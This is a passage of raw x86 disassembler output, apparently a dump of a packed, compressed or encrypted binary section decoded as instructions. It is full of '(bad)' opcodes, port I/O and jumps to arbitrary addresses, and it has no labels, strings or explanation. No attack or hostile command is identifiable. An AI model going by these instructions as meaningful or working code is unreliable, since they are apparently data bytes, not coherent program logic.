  41abe8:	pop    esp
  41abe9:	scas   al,BYTE PTR es:[edi]
  41abea:	loop   0x41ac06
  41abec:	jb     0x41ab8e
  41abee:	mov    al,0xef
  41abf0:	out    0x16,eax
  41abf2:	ret    
  41abf3:	pop    ebp
  41abf4:	call   0x45c6b6b5
  41abf9:	(bad)  
  41abfa:	repnz push esi
  41abfc:	clc    
  41abfd:	xchg   ecx,eax
  41abfe:	push   ebp
  41abff:	sbb    al,0x70
  41ac01:	ss add al,0x8e
  41ac04:	cwde   
  41ac05:	(bad)  
  41ac06:	and    eax,0xf51c9297
  41ac0b:	and    eax,0xf080ddcb
  41ac10:	pop    esi
  41ac11:	adc    eax,0x73af83cb
  41ac16:	or     ebx,edx
  41ac18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac19:	add    eax,0x5f7b0e03
  41ac1e:	sbb    ch,BYTE PTR [esi-0x2f]
  41ac21:	jl     0x41ac10
  41ac23:	pop    DWORD PTR [ebp-0x4f]
  41ac26:	fucom  st(2)
  41ac28:	push   ebp
  41ac29:	data16 xchg dl,cl
  41ac2c:	aas    
  41ac2d:	into   
  41ac2e:	mov    bl,0x0
  41ac30:	mov    ds:0x8c2ff8c6,eax
  41ac35:	dec    esp
  41ac36:	shl    DWORD PTR [edx],1
  41ac38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac39:	cdq    
  41ac3a:	getsec 
  41ac3c:	gs cld 
  41ac3e:	xchg   esp,eax
  41ac3f:	inc    edi
  41ac40:	or     ecx,ebp
  41ac42:	leave  
  41ac43:	(bad)  
  41ac44:	mov    ecx,0xae65fb63
  41ac49:	push   eax
  41ac4a:	mov    dl,0x2d
  41ac4c:	or     DWORD PTR [eax-0x7d],esp
  41ac4f:	mov    ch,0xe1
  41ac51:	add    al,0xe3
  41ac53:	call   0xe0eb70d8
  41ac58:	mov    DWORD PTR fs:[ecx+0x275b2caf],ecx
  41ac5f:	stos   DWORD PTR es:[edi],eax
  41ac60:	imul   ebp,DWORD PTR [eax-0x57ff2749],0x45c58e89
  41ac6a:	xor    edi,DWORD PTR [ebp+0x47]
  41ac6d:	jmp    0x41ac07
  41ac6f:	or     DWORD PTR [ebp-0x4402a089],edi
  41ac75:	popf   
  41ac76:	ja     0x41ac4c
  41ac78:	dec    ebp
  41ac79:	lods   eax,DWORD PTR ds:[esi]
  41ac7a:	or     BYTE PTR [edi+0x7d],0xe5
  41ac7e:	out    dx,eax
  41ac7f:	mov    edi,0xc53e6834
  41ac84:	call   0x5e100a7c
  41ac89:	push   cs
  41ac8a:	and    BYTE PTR [eax+edx*8-0x6bba0fa1],0xb4
  41ac92:	les    eax,FWORD PTR [ebx+0x1c]
  41ac95:	sub    DWORD PTR [edx],ebp
	...
  41ad13:	add    BYTE PTR [ebx+0x42],dl
  41ad16:	or     DWORD PTR [ecx+ebx*1-0x2a100801],edi
  41ad1d:	pop    eax
  41ad1e:	cdq    
  41ad1f:	ror    DWORD PTR [edi+0x1ef402ad],0x4c
  41ad26:	add    DWORD PTR [eax],eax
  41ad28:	imul   eax,DWORD PTR [edi],0x0
  41ad2b:	add    BYTE PTR ds:0xa27b67fb,bl
  41ad31:	ins    DWORD PTR es:[edi],dx
  41ad32:	jge    0x41acce
  41ad34:	sbb    eax,0x71894f50
  41ad39:	scas   eax,DWORD PTR es:[edi]
  41ad3a:	jge    0x41ad58
  41ad3c:	jle    0x41acce
  41ad3e:	xor    al,0x1e
  41ad40:	jns    0x41ad23
  41ad42:	add    DWORD PTR [eax],esp
  41ad44:	enter  0x98e2,0x37
  41ad48:	pop    esp
  41ad49:	pop    edx
  41ad4a:	jge    0x41ad46
  41ad4c:	std    
  41ad4d:	sbb    bl,BYTE PTR [ecx+eiz*4+0x2c]
  41ad51:	mov    ch,0x30
  41ad53:	jb     0x41ad1d
  41ad55:	mov    fs:0xdc8394b9,al
  41ad5b:	gs sti 
  41ad5d:	sbb    al,0xd9
  41ad5f:	pop    esp
  41ad60:	inc    esi
  41ad61:	loopne 0x41ad83
  41ad63:	pop    ds
  41ad64:	enter  0x3c29,0xb9
  41ad68:	outs   dx,DWORD PTR ds:[esi]
  41ad69:	sar    DWORD PTR [ebx],cl
  41ad6b:	rol    ecx,cl
  41ad6d:	inc    esp
  41ad6e:	push   ss
  41ad6f:	and    eax,0xfbe83704
  41ad74:	inc    ecx
  41ad75:	xor    DWORD PTR [ecx+ecx*1-0x5c10cc9],edi
  41ad7c:	mov    ds:0x2dcf34a6,al
  41ad81:	pop    edi
  41ad82:	mov    esp,0x512131fb
  41ad87:	in     eax,0xfc
  41ad89:	mov    BYTE PTR [eax+0x48f680d2],dh
  41ad8f:	cld    
  41ad90:	psubsw mm1,QWORD PTR [ebx-0x3b3c165e]
  41ad97:	imul   edi,DWORD PTR [edx],0xaa7c8e91
  41ad9d:	mov    ebx,0xd290b97d
  41ada2:	pop    edx
  41ada3:	dec    esp
  41ada4:	and    eax,ebp
  41ada6:	push   es
  41ada7:	pop    ebx
  41ada8:	call   0x1fa56645
  41adad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adae:	mov    ch,0x2c
  41adb0:	je     0x41adfc
  41adb2:	add    eax,0xf337d46
  41adb7:	sti    
  41adb8:	(bad)  
  41adba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adbb:	(bad)  
  41adbc:	and    BYTE PTR [eax],bh
  41adbe:	bnd jb 0x41ade9
  41adc1:	(bad)  
  41adc2:	mov    cl,0x6c
  41adc4:	add    eax,0x65ec556a
  41adc9:	xor    BYTE PTR [ebp+0x3a],0x44
  41adcd:	add    edx,DWORD PTR [ebx-0x41]
  41add0:	push   ds
  41add1:	lahf   
  41add2:	xchg   esi,eax
  41add3:	int3   
  41add4:	retf   
  41add5:	push   edx
  41add6:	xchg   ebp,eax
  41add7:	daa    
  41add8:	pop    ss
  41add9:	cmp    DWORD PTR [edi-0x5c441590],edi
  41addf:	aam    0x40
  41ade1:	sub    edx,esp
  41ade3:	mov    ebx,0x4108f7ba
  41ade8:	stc    
  41ade9:	dec    edi
  41adea:	jb     0x41addd
  41adec:	jbe    0x41adb9
  41adee:	push   es
  41adef:	xor    BYTE PTR [edi-0x7d9c087],bh
  41adf5:	cmp    BYTE PTR [ebx+0x4f],ah
  41adf8:	fistp  QWORD PTR [edx-0x73]
  41adfb:	call   0x95eb933a
  41ae00:	push   ds
  41ae01:	or     dh,BYTE PTR [ebp+0x47]
  41ae04:	daa    
  41ae05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae06:	xchg   BYTE PTR [eax],dl
  41ae08:	cmp    al,0x1b
  41ae0a:	je     0x41ae47
  41ae0c:	or     al,al
  41ae0e:	xchg   edi,ebp
  41ae10:	ret    
  41ae11:	pop    eax
  41ae12:	adc    dh,BYTE PTR [edi-0x3d]
  41ae15:	mov    ebp,DWORD PTR [eax-0x678a21be]
  41ae1b:	test   BYTE PTR [edx-0x78],dl
  41ae1e:	dec    eax
  41ae1f:	rol    DWORD PTR [eax+0x19],1
  41ae22:	push   ebx
  41ae23:	ret    
  41ae24:	pop    es
  41ae25:	fild   DWORD PTR ds:0x6d1c9356
  41ae2b:	xor    ah,BYTE PTR [esi+0x75662d22]
  41ae31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae32:	cli    
  41ae33:	sub    eax,0x75417b0
  41ae38:	sbb    BYTE PTR [eax+edi*8+0x36],0x7e
  41ae3d:	aas    
  41ae3e:	add    al,0x9d
  41ae40:	lahf   
  41ae41:	call   0x31b9:0x5deaef53
  41ae48:	jnp    0x41ae6a
  41ae4a:	adc    ah,cl
  41ae4c:	xchg   esp,eax
  41ae4d:	rcl    BYTE PTR [edi-0x34],1
  41ae50:	add    eax,0x928041c6
  41ae55:	sbb    DWORD PTR [edx-0x24],0x2ee33258
  41ae5c:	adc    al,0x5d
  41ae5e:	cmp    BYTE PTR [ebx+0x4c],al
  41ae61:	cmp    eax,DWORD PTR ds:0x81a849c3
  41ae67:	pop    esi
  41ae68:	dec    ebx
  41ae69:	(bad)  
  41ae6a:	mov    ebp,0x8453d0d3
  41ae6f:	jmp    0x4b83c1f3
  41ae74:	scas   eax,DWORD PTR es:[edi]
  41ae75:	mov    dh,0x3
  41ae77:	xchg   edi,eax
  41ae78:	sub    al,0xa5
  41ae7a:	xchg   dl,dh
  41ae7c:	push   0x4b3ad967
  41ae81:	repz xchg ebp,eax
  41ae83:	xchg   esi,eax
  41ae84:	jp     0x41aee6
  41ae86:	sbb    dl,BYTE PTR [ecx-0x60]
  41ae89:	or     al,0xc6
  41ae8b:	inc    edi
  41ae8c:	pop    esi
  41ae8d:	jne    0x41aeab
  41ae8f:	cmp    eax,DWORD PTR [ebx]
  41ae91:	inc    ecx
  41ae92:	(bad)  
  41ae93:	jl     0x41ae45
  41ae95:	pop    edi
  41ae96:	jl     0x41ae6c
  41ae98:	add    eax,0xf9c027f7
  41ae9d:	stos   DWORD PTR es:[edi],eax
  41ae9e:	pop    esi
  41ae9f:	fs dec ecx
  41aea1:	sar    BYTE PTR [eax+0xd],1
  41aea4:	push   0x8db6f270
  41aea9:	push   esp
  41aeaa:	inc    ebp
  41aeab:	pop    ss
  41aeac:	dec    esp
  41aead:	xchg   edi,eax
  41aeae:	loop   0x41ae94
  41aeb0:	lahf   
  41aeb1:	xchg   edx,eax
  41aeb2:	test   cl,dh
  41aeb4:	jbe    0x41aed1
  41aeb6:	call   0xac3:0x547c35c6
  41aebd:	outs   dx,BYTE PTR ds:[esi]
  41aebe:	or     edx,DWORD PTR ds:[eax+0x6fdc8f27]
  41aec5:	add    BYTE PTR [eax-0x4b6cf783],dh
  41aecb:	into   
  41aecc:	rcl    BYTE PTR [esi-0x3d],cl
  41aecf:	dec    ecx
  41aed0:	hlt    
  41aed1:	cmp    esi,esi
  41aed3:	jbe    0x41af23
  41aed5:	hlt    
  41aed6:	adc    DWORD PTR [ecx-0x36],edx
  41aed9:	mov    ds:0xe608d727,al
  41aede:	dec    ecx
  41aedf:	mov    edi,0xafc0839
  41aee4:	jg     0x41af5e
  41aee6:	mov    ds:0x510ab7a0,eax
  41aeeb:	out    0xd9,al
  41aeed:	inc    esi
  41aeee:	loopne 0x41ae94
  41aef0:	xlat   BYTE PTR ds:[ebx]
  41aef1:	clc    
  41aef2:	or     eax,0x86b3e012
  41aef7:	js     0x41aeb9
  41aef9:	rol    BYTE PTR [ebp-0xf],0x65
  41aefd:	mov    ss,WORD PTR [ebx]
  41aeff:	jo     0x41aee8
  41af01:	mov    eax,DWORD PTR [esi+0x1a]
  41af04:	je     0x41ae99
  41af06:	ja     0x41af3a
  41af08:	jmp    0x53296f11
  41af0d:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af0f:	adc    BYTE PTR [eax+0x2b],0x1c
  41af13:	icebp  
  41af14:	scas   eax,DWORD PTR es:[edi]
  41af15:	push   0x182188b5
  41af1a:	mov    bl,0x25
  41af1c:	adc    al,0xd2
  41af1e:	pop    ecx
  41af1f:	lds    ebx,FWORD PTR [eax-0x13]
  41af22:	lea    ecx,[edi]
  41af24:	int3   
  41af25:	xchg   ebp,eax
  41af26:	pusha  
  41af27:	icebp  
  41af28:	mov    gs,WORD PTR [eax]
  41af2a:	xor    edi,DWORD PTR [edi]
  41af2c:	mov    edx,DWORD PTR cs:[esi+0x1e]
  41af30:	ins    BYTE PTR es:[edi],dx
  41af31:	jmp    0x208d6ccb
  41af36:	stos   BYTE PTR es:[edi],al
  41af37:	dec    edi
  41af38:	(bad)  
  41af39:	in     al,dx
  41af3a:	fdiv   QWORD PTR [ecx+0x16]
  41af3d:	inc    ebp
  41af3e:	jl     0x41af2d
  41af40:	inc    edx
  41af41:	in     al,0xac
  41af43:	push   ebx
  41af44:	xchg   esi,eax
  41af45:	stos   BYTE PTR es:[edi],al
  41af46:	div    eax
  41af48:	mov    ah,0xa4
  41af4a:	fdiv   DWORD PTR [edx]
  41af4c:	xchg   DWORD PTR [ebp-0x6b],eax
  41af4f:	add    eax,0x138d24c
  41af54:	pop    DWORD PTR [edi+0x49]
  41af57:	jecxz  0x41af84
  41af59:	data16 aas 
  41af5b:	js     0x41afa4
  41af5d:	sub    BYTE PTR [edx-0x8f75aa6],bh
  41af63:	pop    ebp
  41af64:	jno    0x41af3f
  41af66:	sub    DWORD PTR [edx+0x4d],esp
  41af69:	mov    ds:0x1169e7b1,al
  41af6e:	sbb    ch,BYTE PTR ds:[edx+0x63326794]
  41af75:	dec    eax
  41af76:	popa   
  41af77:	std    
  41af78:	aam    0x9a
  41af7a:	pop    ecx
  41af7b:	pop    ecx
  41af7c:	cmp    BYTE PTR ds:0x8984b65d,bl
  41af82:	add    DWORD PTR [ecx-0x3d33cfa5],edi
  41af88:	call   0xa34a305f
  41af8d:	and    DWORD PTR [esi+0x0],esp
  41af90:	lods   eax,DWORD PTR ds:[esi]
  41af91:	sar    DWORD PTR [esi],1
  41af93:	mov    ch,BYTE PTR [eax]
  41af95:	out    0x8d,eax
  41af97:	faddp  st(0),st
  41af99:	ret    
  41af9a:	xchg   edx,eax
  41af9b:	into   
  41af9c:	repz xor ah,al
  41af9f:	jge    0x41b01a
  41afa1:	ds jle 0x41b00c
  41afa4:	inc    esp
  41afa5:	pop    esi
  41afa6:	or     esi,DWORD PTR [ecx+0x21221970]
  41afac:	jg     0x41b024
  41afae:	push   0xffffffca
  41afb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afb1:	hlt    
  41afb2:	jmp    0x6a1e:0xc5f84ab3
  41afb9:	stc    
  41afba:	aad    0x7a
  41afbc:	jmp    0xa6b70e1d
  41afc1:	test   eax,0x8141d1b6
  41afc6:	jle    0x41afca
  41afc8:	icebp  
  41afc9:	shl    BYTE PTR [edi-0x2e78ac51],1
  41afcf:	xchg   edi,eax
  41afd0:	mov    dh,0xaa
  41afd2:	cmp    DWORD PTR [edx-0x590e7982],edx
  41afd8:	add    cl,dl
  41afda:	jbe    0x41afc5
  41afdc:	(bad)  
  41afdd:	js     0x41af8e
  41afdf:	mov    esp,0xe98acc52
  41afe4:	jno    0x41afb3
  41afe6:	ins    DWORD PTR es:[edi],dx
  41afe7:	or     esi,ecx
  41afe9:	(bad)  
  41afea:	sub    dh,dl
  41afec:	xchg   al,al
  41afee:	cmp    al,0x86
  41aff0:	pop    esp
  41aff1:	dec    esi
  41aff2:	cwde   
  41aff3:	ds dec esp
  41aff5:	sub    DWORD PTR [esi],edx
  41aff7:	jg     0x41afeb
  41aff9:	xchg   esp,eax
  41affa:	sbb    ah,BYTE PTR ss:[ebp+ecx*1-0x3b]
  41afff:	push   esp
  41b000:	pop    esi
  41b001:	mov    dl,0xdf
  41b003:	into   
  41b004:	and    esp,ebx
  41b006:	ud1    ebp,edi
  41b009:	mov    bl,0x7b
  41b00b:	sub    eax,esp
  41b00d:	pop    ss
  41b00e:	mov    eax,ds:0x31158ebc
  41b013:	adc    esi,DWORD PTR [edi]
  41b015:	clc    
  41b016:	jp     0x41b06c
  41b018:	dec    ebp
  41b019:	into   
  41b01a:	stc    
  41b01b:	loopne 0x41afc6
  41b01d:	jecxz  0x41b054
  41b01f:	push   edx
  41b020:	inc    eax
  41b021:	(bad)  
  41b022:	cs xchg ecx,eax
  41b024:	sbb    al,0xe
  41b026:	inc    edi
  41b027:	cmp    dh,BYTE PTR [ebx+0x25]
  41b02a:	mov    esp,0x8b732dde
  41b02f:	les    eax,FWORD PTR [esi-0x1aaf1493]
  41b035:	xor    BYTE PTR [ebp+0x154b7213],bl
  41b03b:	addr16 sar esi,1
  41b03e:	std    
  41b03f:	adc    ch,BYTE PTR [ebp+ebp*1-0x6e]
  41b043:	pop    edx
  41b044:	add    eax,0xe4d93b02
  41b049:	sub    edx,edi
  41b04b:	pop    esp
  41b04c:	mov    esp,0x260b0b88
  41b051:	pop    ecx
  41b052:	adc    al,0x58
  41b054:	(bad)  
  41b056:	push   edi
  41b057:	or     DWORD PTR [eax],esp
  41b059:	ss push edi
  41b05b:	pop    es
  41b05c:	fsubr  DWORD PTR [esi+0x40]
  41b05f:	arpl   WORD PTR [eax+ecx*1+0x5536bf62],ax
  41b066:	dec    esp
  41b067:	or     eax,ebx
  41b069:	adc    eax,0xffb2a32d
  41b06e:	jbe    0x41b0a0
  41b070:	ss jae 0x41b064
  41b073:	pop    ebp
  41b074:	lahf   
  41b075:	inc    eax
  41b076:	fistp  WORD PTR [eax+0x26]
  41b079:	mov    esp,0x79e6884f
  41b07e:	arpl   WORD PTR [ebp+0x31],sp
  41b081:	push   0x2511498b
  41b086:	cmp    ebp,DWORD PTR [ebx]
  41b088:	jg     0x41b0da
  41b08a:	clc    
  41b08b:	scas   al,BYTE PTR es:[edi]
  41b08c:	sbb    edx,0x684e84d7
  41b092:	adc    eax,0x141f9f2f
  41b097:	xor    al,0x5
  41b099:	ror    DWORD PTR [edi-0xd87aa18],cl
  41b09f:	or     ch,al
  41b0a1:	sub    ah,BYTE PTR [edi]
  41b0a3:	or     eax,0xa430cac6
  41b0a8:	sub    eax,DWORD PTR [ecx+0x6998fd51]
  41b0ae:	fwait
  41b0af:	out    0xcc,al
  41b0b1:	(bad)
  41b0b4:	arpl   WORD PTR [esp+eiz*4+0x2a80c399],di
  41b0bb:	jo     0x41b0d5
  41b0bd:	addr16 or al,0x5
  41b0c0:	xchg   ebp,eax
  41b0c1:	test   al,0xfa
  41b0c3:	out    dx,al
  41b0c4:	add    ebx,esi
  41b0c6:	mov    bh,0x1f
  41b0c8:	adc    al,0x67
  41b0ca:	enter  0x701,0x64
  41b0ce:	cld    
  41b0cf:	outs   dx,DWORD PTR ds:[esi]
  41b0d0:	jne    0x41b0c3
  41b0d2:	and    ch,BYTE PTR gs:[edi+ebx*2]
  41b0d6:	shr    DWORD PTR [edx],cl
  41b0d8:	mov    dl,0x5c
  41b0da:	out    dx,al
  41b0db:	dec    edi
  41b0dc:	inc    ebx
  41b0dd:	jmp    0xcd1ef8e6
  41b0e2:	(bad)  
  41b0e3:	dec    eax
  41b0e5:	cmp    eax,0xf0ffcd5
  41b0ea:	push   es
  41b0eb:	sbb    esp,DWORD PTR [ebp-0x14]
  41b0ee:	and    eax,0x4bc75382
  41b0f3:	or     ebp,ebp
  41b0f5:	das    
  41b0f6:	je     0x41b135
  41b0f8:	and    DWORD PTR [edi-0x24d881d5],0x5
  41b0ff:	push   esi
  41b100:	add    dl,BYTE PTR [eax]
  41b102:	mov    bl,0x35
  41b104:	push   eax
  41b105:	or     ah,ah
  41b107:	or     ebp,DWORD PTR [ebx-0x77]
  41b10a:	inc    esp
  41b10b:	scas   eax,DWORD PTR es:[edi]
  41b10c:	dec    esp
  41b10d:	or     ebp,DWORD PTR [ecx+0x659972e8]
  41b113:	mov    ah,BYTE PTR [esi-0x46]
  41b116:	mov    ds:0x9c3b6a90,al
  41b11b:	xor    BYTE PTR [edi],bl
  41b11d:	in     al,dx
  41b11e:	(bad)  
  41b11f:	in     eax,dx
  41b120:	jp     0x41b178
  41b122:	or     al,0x2a
  41b124:	or     esp,edx
  41b126:	sbb    eax,0xdb609656
  41b12b:	sbb    cl,bl
  41b12d:	sub    eax,0xbdaa47c2
  41b132:	stc    
  41b133:	or     BYTE PTR [ecx],bl
  41b135:	(bad)  
  41b136:	loop   0x41b1b2
  41b138:	mov    WORD PTR [ebp-0x58],?
  41b13b:	xor    eax,DWORD PTR [ebp-0x7d2881b0]
  41b141:	fwait
  41b142:	or     eax,0x32c1c541
  41b147:	mov    si,0x10c8
  41b14b:	xor    al,0x64
  41b14d:	sbb    DWORD PTR [ebx],0xa1b20c3b
  41b153:	clc    
  41b154:	xchg   DWORD PTR [eax+0x75],ecx
  41b157:	pop    eax
  41b158:	mov    bl,0x78
  41b15a:	adc    eax,0xc19e6567
  41b15f:	pop    ebp
  41b160:	stos   BYTE PTR es:[edi],al
  41b161:	int3   
  41b162:	call   0x4667:0x65a3c923
  41b169:	imul   ebx,esi,0xffffff91
  41b16c:	stc    
  41b16d:	outs   dx,BYTE PTR ds:[esi]
  41b16e:	pusha  
  41b16f:	into   
  41b170:	fs pop eax
  41b172:	push   ebp
  41b173:	mov    dl,0x6a
  41b175:	inc    eax
  41b176:	and    esi,esp
  41b178:	jg     0x7f123fde
  41b17e:	dec    esp
  41b17f:	in     eax,dx
  41b180:	add    cl,dl
  41b182:	and    ch,ah
  41b184:	push   esi
  41b185:	jnp    0x41b18a
  41b187:	and    eax,DWORD PTR ds:0xe8a83552
  41b18d:	jecxz  0x41b1b8
  41b18f:	in     al,dx
  41b190:	icebp  
  41b191:	inc    eax
  41b192:	shl    al,0x4c
  41b195:	sbb    BYTE PTR [eax+ebx*2],dh
  41b198:	jne    0x41b216
  41b19a:	jmp    0x41b19e
  41b19c:	xchg   ebx,eax
  41b19d:	xlat   BYTE PTR ds:[ebx]
  41b19e:	add    BYTE PTR [ebp-0x1525e707],dh
  41b1a4:	cmp    BYTE PTR [edi-0x466c62d6],bl
  41b1aa:	jge    0x41b218
  41b1ac:	fcmovnu st,st(0)
  41b1ae:	outs   dx,BYTE PTR ds:[esi]
  41b1af:	ror    DWORD PTR [ebp+0x4b],cl
  41b1b2:	mov    eax,ds:0x18b354cd
  41b1b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1b8:	sbb    al,0xa7
  41b1ba:	sbb    ebx,ecx
  41b1bc:	adc    eax,0xeeb8ceae
  41b1c1:	je     0x41b215
  41b1c3:	pop    ebp
  41b1c4:	cmp    al,0x57
  41b1c6:	add    eax,0xfa203711
  41b1cb:	dec    esp
  41b1cc:	js     0x41b213
  41b1ce:	dec    ebp
  41b1cf:	(bad)
  41b1d3:	(bad)  ds:[ecx]
  41b1d6:	xchg   edx,eax
  41b1d7:	aas    
  41b1d8:	dec    ecx
  41b1d9:	and    BYTE PTR [ebp+0x7e],0x6b
  41b1dd:	into   
  41b1de:	lock cmp eax,0x2e070e9b
  41b1e4:	cmp    al,0x95
  41b1e6:	mov    WORD PTR [ebx+edi*4],gs
  41b1e9:	xchg   ebx,eax
  41b1ea:	mov    cl,bh
  41b1ec:	xchg   edx,eax
  41b1ed:	(bad)  
  41b1ee:	pop    ds
  41b1ef:	loope  0x41b203
  41b1f1:	adc    DWORD PTR [esp+edi*4+0x5d],edi
  41b1f5:	dec    eax
  41b1f6:	adc    al,0x7e
  41b1f8:	mov    bl,0x86
  41b1fa:	xor    ch,BYTE PTR [edi+0x5dc84d3a]
  41b200:	dec    edi
  41b201:	xor    DWORD PTR [eiz*8+0x5592065],edi
  41b208:	push   edi
  41b209:	nop
  41b20a:	sbb    eax,0xc03425e0
  41b20f:	sub    ebx,DWORD PTR [esi-0x5d]
  41b212:	sbb    al,0x8d
  41b214:	mov    dl,0x35
  41b216:	jmp    0xaeeb:0x490edceb
  41b21d:	loop   0x41b290
  41b21f:	outs   dx,DWORD PTR ds:[esi]
  41b220:	jge    0x41b1b1
  41b222:	jae    0x41b227
  41b224:	adc    eax,0xafba5ea1
  41b229:	test   eax,edx
  41b22b:	aad    0x6c
  41b22d:	push   ss
  41b22e:	call   0x5a:0xff7c0071
  41b235:	imul   ebp,edi,0xffffff93
  41b238:	sbb    eax,0x5e
  41b23b:	das    
  41b23c:	fmul   QWORD PTR [ecx-0xed4fe9a]
  41b242:	mov    BYTE PTR ds:0x2c18cf5d,al
  41b248:	pop    eax
  41b249:	pop    esi
  41b24a:	fst    QWORD PTR [eax-0x584b5e7e]
  41b250:	aam    0x4f
  41b252:	fld    DWORD PTR [ecx-0x25]
  41b255:	mov    dl,0x68
  41b257:	mov    eax,ds:0x40ab3f2d
  41b25c:	inc    ecx
  41b25d:	adc    dh,0x19
  41b260:	ret    
  41b261:	pop    eax
  41b262:	pop    ebp
  41b263:	or     cl,BYTE PTR [ecx+ebx*2-0x25]
  41b267:	or     DWORD PTR [ebx-0x5e018d92],eax
  41b26d:	data16 jg 0x41b217
  41b270:	fbstp  TBYTE PTR [esi]
  41b272:	sbb    eax,0xa1bbdd79
  41b277:	pop    ecx
  41b278:	pop    ebp
  41b279:	adc    DWORD PTR [eax-0x68d2eec9],esi
  41b27f:	inc    ecx
  41b280:	lock aad 0xf
  41b283:	rcl    BYTE PTR [ecx],1
  41b285:	je     0x41b2e8
  41b287:	pop    ds
  41b288:	jns    0x41b2b1
  41b28a:	loopne 0x41b30a
  41b28c:	or     al,0xc8
  41b28e:	adc    bh,BYTE PTR [edi-0xf]
  41b291:	jne    0x41b284
  41b293:	pop    ds
  41b294:	push   ebp
  41b295:	sbb    eax,0xab05bbfd
  41b29a:	repz loopne 0x41b274
  41b29d:	inc    edx
  41b29e:	sbb    ebp,DWORD PTR [ecx+ecx*2]
  41b2a1:	dec    esp
  41b2a2:	push   0x55c863c8
  41b2a7:	dec    ecx
  41b2a8:	test   DWORD PTR ds:0x14650dff,ebx
  41b2ae:	es jae 0x41b275
  41b2b1:	push   ecx
  41b2b2:	pop    ebp
  41b2b3:	xlat   BYTE PTR ds:[ebx]
  41b2b4:	pusha  
  41b2b5:	sub    BYTE PTR [eax+eax*1],al
  41b2b8:	sbb    edi,DWORD PTR [esi-0x38]
  41b2bb:	scas   al,BYTE PTR es:[edi]
  41b2bc:	emms   
  41b2be:	mov    eax,0x1c25ac53
  41b2c3:	fisttp QWORD PTR [ebx-0x3e8295d0]
  41b2c9:	mov    esp,0x5e622d12
  41b2ce:	dec    ebx
  41b2cf:	loopne 0x41b31f
  41b2d1:	or     DWORD PTR [ebp-0x3d],0xffffff88
  41b2d5:	pop    edx
  41b2d6:	sbb    al,0x9a
  41b2d8:	xor    DWORD PTR [ebx+0x1],ebx
  41b2db:	fld    TBYTE PTR [edx+0x44]
  41b2de:	sub    ch,BYTE PTR [edx-0x5e]
  41b2e1:	sub    DWORD PTR [edi+eiz*8],eax
  41b2e4:	cwde   
  41b2e5:	out    0xf4,al
  41b2e7:	and    ch,BYTE PTR [esp+ebx*8-0x3b5e0c15]
  41b2ee:	dec    edx
  41b2ef:	js     0x41b2fd
  41b2f1:	xlat   BYTE PTR ds:[ebx]
  41b2f2:	push   es
  41b2f3:	loope  0x41b2d0
  41b2f5:	lahf   
  41b2f6:	and    DWORD PTR [edi+0x7d],ebx
  41b2f9:	pop    ebp
  41b2fa:	fstp   TBYTE PTR [eax-0x191de646]
  41b300:	inc    eax
  41b301:	mov    edx,0xff4f28b2
  41b306:	mov    esp,ds
  41b308:	inc    edi
  41b309:	pop    esp
  41b30a:	mov    ds:0x2f5dd5f9,al
  41b30f:	jg     0x41b367
  41b311:	and    ebx,DWORD PTR [edx-0x74fb491a]
  41b317:	rcr    BYTE PTR [esi],0x2e
  41b31a:	push   0x48
  41b31c:	pop    esp
  41b31d:	pusha  
  41b31e:	dec    ebp
  41b31f:	(bad)  
  41b320:	push   0x37
  41b322:	and    cl,bl
  41b324:	jmp    0xeb302afd
  41b329:	inc    ebx
  41b32a:	adc    eax,0x4059095e
  41b32f:	hlt    
  41b330:	(bad)  
  41b331:	fcmovbe st,st(1)
  41b333:	pop    ds
  41b334:	call   0x1880d954
  41b339:	shr    DWORD PTR [ebx+0x13],0x6c
  41b33d:	cmp    ah,BYTE PTR [ecx-0x5f106fd1]
  41b343:	push   edx
  41b344:	xchg   edi,eax
  41b345:	call   0x3096cb33
  41b34a:	xchg   ecx,eax
  41b34b:	jp     0x41b3cb
  41b34d:	rol    BYTE PTR [ebp+0x6079a36e],cl
  41b353:	fisubr DWORD PTR [esi+0x24e35bdf]
  41b359:	adc    BYTE PTR [ebx],bh
  41b35b:	jns    0x41b2e0
  41b35d:	pushf  
  41b35e:	add    al,0x12
  41b360:	xor    eax,0x1b20e24e
  41b365:	ror    DWORD PTR [esi],0x67
  41b368:	jmp    0x4795:0x47ef0172
  41b36f:	jl     0x41b30e
  41b371:	xchg   edx,eax
  41b372:	inc    esp
  41b373:	sbb    ah,bh
  41b375:	xchg   ebx,edi
  41b377:	and    DWORD PTR [edx-0x36c7301],eax
  41b37d:	dec    ebx
  41b37e:	fcom   DWORD PTR [esi+esi*2]
  41b381:	add    DWORD PTR [eax-0x21],edi
  41b384:	cmp    eax,0xa4207770
  41b389:	inc    esi
  41b38a:	xor    BYTE PTR [esi+0x62],ch
  41b38d:	and    eax,DWORD PTR [edx+0x51a63783]
  41b393:	shl    DWORD PTR [eax-0x42],0xdf
  41b397:	xor    esp,DWORD PTR [ecx-0x53]
  41b39a:	jecxz  0x41b36d
  41b39c:	add    BYTE PTR [edx-0xe71b03b],bl
  41b3a2:	repnz ds add eax,0x6b0f1a5e
  41b3a9:	mov    dh,0x3a
  41b3ab:	data16 adc al,0xfa
  41b3ae:	jmp    0xc6da:0x28e81a84
  41b3b5:	test   DWORD PTR gs:[ebx],ebp
  41b3b8:	push   ds
  41b3b9:	pop    ebx
  41b3ba:	mov    esp,0x6afd79eb
  41b3bf:	hlt    
  41b3c0:	sub    eax,0x927028b8
  41b3c5:	iret   
  41b3c6:	adc    ecx,DWORD PTR ds:0x7818df66
  41b3cc:	scas   al,BYTE PTR es:[edi]
  41b3cd:	div    ecx
  41b3cf:	in     al,dx
  41b3d0:	jecxz  0x41b3eb
  41b3d2:	int    0xf9
  41b3d4:	shr    DWORD PTR [ecx+edi*2],0x7b
  41b3d8:	push   edx
  41b3d9:	out    0xdb,eax
  41b3db:	call   0xd722:0x25233add
  41b3e2:	sub    edi,DWORD PTR [eax-0x5e]
  41b3e5:	loop   0x41b43b
  41b3e7:	dec    esp
  41b3e8:	inc    eax
  41b3e9:	out    0x95,al
  41b3eb:	jg     0x41b388
  41b3ed:	mov    esp,0x633f8498
  41b3f2:	lea    eax,[edi-0x39]
